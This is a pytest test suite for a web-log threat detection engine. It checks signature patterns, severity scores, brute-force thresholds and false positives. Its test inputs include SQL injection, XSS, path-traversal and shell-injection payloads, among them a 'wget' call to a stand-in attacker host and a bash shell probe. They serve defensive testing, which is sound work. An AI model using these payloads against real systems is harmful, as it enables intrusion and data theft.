"""
test_detection.py
-----------------------
Comprehensive test suite for the detection engine, including signature
validation, pattern matching accuracy, and stateful detection logic.

Structure:
    - Signature Registry: Ensures all security signatures are well-formed.
    - Pattern Matching: Validates regex against known attack payloads.
    - Detector Engine: Verifies the end-to-end detection flow.
    - Brute Force: Tests stateful logic across multiple log entries.
"""
from __future__ import annotations

__author__ = "Kara, Yusuf Sinan"
__credits__ = "Claude (Anthropic)"

import os
import sys
import pytest
from detection import signatures
from detection.detector import DetectorConfig, ThreatDetector
from tests.conftest import make_entry

# Ensure the root directory is in the path for module discovery
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))


# -- Helper functions for tests --------------------------

def run(entries):
    """
    Shortcut to initialize the detector and return the analysis results.
    """
    return ThreatDetector(entries).analyse()


def threat_types(entries):
    """
    Returns a flat list of threat types found in the given entries.
    Useful for 'assert "X" in threat_types(...)' style tests.
    """
    results = []

    for t in run(entries):
        results.append(t.threat_type)

    return results


def one(entry):
    """
    Analyzes a single log entry.
    """
    return run([entry])

# -- Signature registry tests -----------------------------


class TestSignatureRegistry:
    """
    Validates that the 'signatures.py' registry contains valid,
    non-corrupt security definitions.
    """
    def test_signatures_is_non_empty(self):
        """The registry must contain at least one active signature."""
        assert len(signatures.SIGNATURES) > 0

    @pytest.mark.parametrize("sig", signatures.SIGNATURES)
    def test_threat_type_is_non_empty_string(self, sig):
        """Each signature must define a valid threat category name."""
        assert isinstance(sig.threat_type, str) and sig.threat_type

    @pytest.mark.parametrize("sig", signatures.SIGNATURES)
    def test_severity_is_valid_label(self, sig):
        """Severity must strictly match one of the allowed UI labels."""
        assert sig.severity in {"LOW", "MEDIUM", "HIGH", "CRITICAL"}

    @pytest.mark.parametrize("sig", signatures.SIGNATURES)
    def test_score_in_range(self, sig):
        """
        The severity score must be between 1 and 10 for risk calculations.
        This ensures consistent scoring across all signatures.
        """
        assert 1 <= sig.severity_score <= 10

    @pytest.mark.parametrize("sig", signatures.SIGNATURES)
    def test_extract_returns_string(self, sig):
        """
        The extraction logic must always return a string for regex processing.
        This allows the detector to apply patterns without type errors.
        """
        entry = make_entry()
        result = sig.extract(entry)
        assert isinstance(result, str)

    @pytest.mark.parametrize("sig", signatures.SIGNATURES)
    def test_description_is_non_empty(self, sig):
        """Descriptions are required for human-readable reporting."""
        assert isinstance(sig.description, str) and sig.description


# -- Raw pattern matching tests -----------------------------

class TestSignatureMatching:
    """
    Directly tests the regex patterns against known malicious payloads.

    This bypasses the detector logic to isolate pattern quality.
    """

    def _sig(self, threat_type: str):
        """
        Helper to find a specific signature by its type ID.
        This allows us to test each pattern in with relevant payloads.
        """
        return next(
            s for s in signatures.SIGNATURES if s.threat_type == threat_type
        )

    # 1. SQL Injection
    @pytest.mark.parametrize(
        "payload",
        [
            "UNION SELECT * FROM users",
            "DROP TABLE sessions",
            "exec(xp_cmdshell('dir'))",
            "SELECT * FROM information_schema",
        ],
    )
    def test_sqli_matches(self, payload):
        """
        Verify the SQLi pattern catches common SQL injection syntax.
        This is critical for identifying attempts
        to manipulate database queries.
        """
        assert self._sig("SQL_INJECTION").pattern.search(payload)

    # 2. XSS Attempt
    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "onerror=alert(document.cookie)",
            "javascript:void(0)",
            "eval('x')",
        ],
    )
    def test_xss_matches(self, payload):
        """
        Verify the XSS pattern catches script tags and event handlers.
        This is essential for identifying attempts
        to inject malicious scripts.
        """
        assert self._sig("XSS_ATTEMPT").pattern.search(payload)

    # 3. Path Traversal
    @pytest.mark.parametrize(
        "payload",
        [
            "../../../etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "%2e%2e%2fetc%2fpasswd",
        ],
    )
    def test_traversal_matches(self, payload):
        """
        Verify the Path Traversal pattern catches navigation attempts.
        This is crucial for identifying attempts to access sensitive files.
        """
        assert self._sig("PATH_TRAVERSAL").pattern.search(payload)

    # 4. RCE Probe
    @pytest.mark.parametrize(
        "payload",
        [
            ";wget http://evil.com/x",
            "`id`",
            "$(whoami)",
            "/bin/bash -i",
            "powershell Get-Process",
        ],
    )
    def test_rce_matches(self, payload):
        """
        Ensure the RCE pattern identifies various shell injection attempts.
        This is critical for catching high-risk probes that could lead to.
        """
        assert self._sig("RCE_PROBE").pattern.search(payload)

    # 5. Scanner Detection
    @pytest.mark.parametrize(
        "ua",
        ["sqlmap/1.7", "nikto/2.1", "nuclei/2.9", "gobuster/3"]
    )
    def test_bad_ua_matches(self, ua):
        """
        Detect known security scanners via their User-Agent strings.
        This is a simple but effective heuristic
        to catch reconnaissance activity.
        """
        assert self._sig("SCANNER_DETECTED").pattern.search(ua)

    def test_normal_ua_not_matched(self):
        """
        Ensure legitimate browsers are not flagged as scanners.
        """
        assert not self._sig("SCANNER_DETECTED").pattern.search(
            "Mozilla/5.0 Windows"
        )

    def test_clean_path_not_matched_by_sqli(self):
        """
        Verify that benign paths do not trigger SQLi false positives.
        """
        assert not self._sig("SQL_INJECTION").pattern.search("/products/42")


# -- Detector: generic engine tests -----------------------------

class TestDetectorEngine:
    """
    End-to-end tests for the ThreatDetector engine.
    Ensures that log entries are correctly routed through all signatures.
    """

    def test_sqli_detected(self):
        assert "SQL_INJECTION" in threat_types(
            [make_entry(path="/q?=1 UNION SELECT * FROM u")]
        )

    def test_sqli_critical_score_9(self):
        t = next(
            (x for x in one(make_entry(path="/q?=UNION SELECT"))
            if x.threat_type == "SQL_INJECTION"),
            None
            )
        assert t and t.severity == "CRITICAL" and t.severity_score == 9

    def test_xss_detected_in_path(self):
        assert "XSS_ATTEMPT" in threat_types(
            [make_entry(path="/s?q=<script>alert(1)</script>")]
        )

    def test_xss_detected_in_referrer(self):
        assert "XSS_ATTEMPT" in threat_types(
            [make_entry(referrer="<script>evil</script>")]
        )

    def test_xss_high_score_7(self):
        t = next(
            (x for x in one(make_entry(path="/x?q=<script>x</script>"))
            if x.threat_type == "XSS_ATTEMPT"),
            None
        )
        assert t and t.severity == "HIGH" and t.severity_score == 7

    def test_traversal_detected(self):
        assert "PATH_TRAVERSAL" in threat_types(
            [make_entry(path="/files/../../../etc/passwd")]
        )

    def test_traversal_high_score_8(self):
        t = next(
            (x for x in one(make_entry(path="/../etc/passwd"))
            if x.threat_type == "PATH_TRAVERSAL"),
            None
        )
        assert t and t.severity == "HIGH" and t.severity_score == 8

    def test_rce_detected(self):
        assert "RCE_PROBE" in threat_types(
            [make_entry(path="/cgi?cmd=;wget http://evil.com/x")]
        )

    def test_rce_critical_score_10(self):
        t = next(
            (x for x in one(make_entry(path="/x?c=;wget x"))
            if x.threat_type == "RCE_PROBE"),
            None
        )
        assert t and t.severity == "CRITICAL" and t.severity_score == 10

    def test_scanner_ua_detected(self):
        assert "SCANNER_DETECTED" in threat_types(
            [make_entry(user_agent="sqlmap/1.7")]
        )

    def test_normal_ua_not_flagged(self):
        assert "SCANNER_DETECTED" not in threat_types(
            [make_entry(user_agent="Mozilla/5.0")]
        )

    def test_scanner_medium_score_5(self):
        t = next(
            (x for x in one(make_entry(user_agent="nikto/2.1"))
            if x.threat_type == "SCANNER_DETECTED"),
            None
            )
        assert t and t.severity == "MEDIUM" and t.severity_score == 5

    @pytest.mark.parametrize("method",
                             ["DELETE", "PUT", "TRACE", "CONNECT", "PATCH"])
    def test_suspicious_method_flagged(self, method):
        assert "SUSPICIOUS_METHOD" in threat_types(
            [make_entry(method=method)]
        )

    @pytest.mark.parametrize("method", ["GET", "POST", "HEAD"])
    def test_normal_method_not_flagged(self, method):
        assert "SUSPICIOUS_METHOD" not in threat_types(
            [make_entry(method=method)]
        )

    def test_suspicious_method_low_score_3(self):
        t = next(
            (x for x in one(make_entry(method="TRACE"))
             if x.threat_type == "SUSPICIOUS_METHOD"),
            None
        )
        assert t and t.severity == "LOW" and t.severity_score == 3

    def test_source_ip_recorded_correctly(self):
        """
        Verify that the source IP address is correctly extracted and
        assigned to the generated ThreatEvent.
        """
        # 1. Generate the threat events for a single malicious entry
        malicious_entry = make_entry(ip="9.9.9.9", path="/q?=UNION SELECT")
        threats = one(malicious_entry)

        # 2. Find the SQL_INJECTION threat in the results
        t = None
        for x in threats:
            if x.threat_type == "SQL_INJECTION":
                t = x
                break  # We stop at the first match, just like next() would

        # 3. Assert that the threat was found and the IP is correct
        assert t is not None, "SQL_INJECTION threat was not detected"
        assert t.source_ip == "9.9.9.9"


# -- Brute force (stateful) ----------------------------------------------

class TestBruteForce:
    """
    Tests stateful detection logic (e.g., counting failures per IP).
    """

    def _fails(self, ip: str, count: int, status: int = 401):
        return [make_entry(ip=ip, status_code=status) for _ in range(count)]

    def test_triggers_at_threshold(self):
        assert "BRUTE_FORCE" in threat_types(self._fails("x", 10))

    def test_no_trigger_below_threshold(self):
        assert "BRUTE_FORCE" not in threat_types(self._fails("x", 9))

    def test_403_counts_same_as_401(self):
        assert "BRUTE_FORCE" in threat_types(self._fails("x", 10, status=403))

    def test_per_ip_isolation(self):
        # 9 from A + 9 from B = neither should trigger
        entries = self._fails("a", 9) + self._fails("b", 9)
        assert "BRUTE_FORCE" not in threat_types(entries)

    def test_source_ip_recorded(self):
        t = next(x for x in run(self._fails("99.99.99.99", 10))
                 if x.threat_type == "BRUTE_FORCE")
        assert t.source_ip == "99.99.99.99"

    def test_severity_critical_score_9(self):
        t = next(x for x in run(self._fails("x", 10))
                 if x.threat_type == "BRUTE_FORCE")
        assert t.severity == "CRITICAL" and t.severity_score == 9


# -- DetectorConfig -----------------------------------------------------------

class TestDetectorConfig:
    """
    Validates that the DetectorConfig properly handles threshold settings
    and that the ThreatDetector respects these configurations.
    """

    def test_default_threshold_is_10(self):
        """
        Verify that the default brute force threshold is set to 10
        if no custom value is provided.
        """
        assert DetectorConfig().brute_force_threshold == 10

    def test_custom_threshold_respected(self):
        """
        Ensure that the detector triggers a BRUTE_FORCE event when
        the number of failures exactly matches a custom-defined threshold.
        """
        # Create 5 failed attempts
        entries = [make_entry(ip="z", status_code=401)] * 5
        # Set the limit to exactly 5
        config = DetectorConfig(brute_force_threshold=5)
        threats = ThreatDetector(entries, config).analyse()
        assert any(t.threat_type == "BRUTE_FORCE" for t in threats)

    def test_custom_threshold_not_exceeded(self):
        """
        Ensure that no BRUTE_FORCE event is triggered if the number
        of failures is even one below the custom threshold.
        """
        # 4 attempts is not enough if the threshold is 5
        entries = [make_entry(ip="z", status_code=401)] * 4
        config = DetectorConfig(brute_force_threshold=5)
        threats = ThreatDetector(entries, config).analyse()
        assert not any(t.threat_type == "BRUTE_FORCE" for t in threats)


# -- Clean traffic ----------------------------------------------

class TestCleanTraffic:
    """
    False Positive Check: Ensure normal traffic is never flagged as a threat.
    """
    def test_no_threats_on_normal_traffic(self):
        entries = [
            make_entry(path="/"),
            make_entry(path="/about"),
            make_entry(path="/products/42", method="GET", status_code=200),
            make_entry(path="/contact",     method="POST", status_code=201),
        ]
        assert run(entries) == []
